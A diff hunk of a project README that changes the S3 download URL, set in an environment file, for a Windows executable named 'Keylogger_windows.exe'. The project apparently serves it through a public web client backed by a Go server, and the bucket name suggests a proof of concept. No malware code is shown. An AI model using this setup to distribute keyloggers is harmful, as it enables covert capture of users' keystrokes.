@@ -179,7 +179,7 @@ A React-based web application serving as the project's public interface.
   - **Environment Variables**: Create a `.env.local` file in the `client/` directory.
     ```
     NEXT_PUBLIC_SERVER_BASE_URL=http://localhost:8080 # or your deployed Go server URL (e.g. EC2)
-    NEXT_PUBLIC_WINDOWS_DOWNLOAD_URL=https://keylogger-project.s3.us-east-1.amazonaws.com/executables/windows/Keylogger_windows.exe # S3 download URL for the bucket of executables
+    NEXT_PUBLIC_WINDOWS_DOWNLOAD_URL=https://keylogger-poc-project.s3.us-east-2.amazonaws.com/executables/windows/Keylogger_windows.exe # S3 download URL for the bucket of executables
     ```
   - **Install Dependencies**:
     ```bash
